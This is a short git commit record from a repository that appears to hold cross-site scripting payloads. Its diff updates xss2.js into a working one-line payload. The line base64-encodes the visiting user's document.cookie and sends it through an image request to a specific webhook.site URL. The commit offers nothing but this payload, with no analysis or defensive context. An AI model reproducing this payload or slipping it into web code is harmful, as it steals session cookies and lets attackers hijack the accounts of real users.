3615ae888262243a0ac31cfb6b9b90a093269797
Latens Tech <132476701+LatensTech@users.noreply.github.com>
2025-06-04 07:30:26 +0300

    Update xss2.js

--- xss2.js
+++ xss2.js
@@ -1,3 +1,1 @@
-new Image(); x.src = 'https://webhook.site/xxxxxxx-xxxx-xxxx-xxxx-xxxxxxx?
-
-data='+btoa(document.cookie);
+new Image().src = 'https://webhook.site/05a4982f-0a9e-466b-b20d-37e3ae1274d6?data=' + btoa(document.cookie);
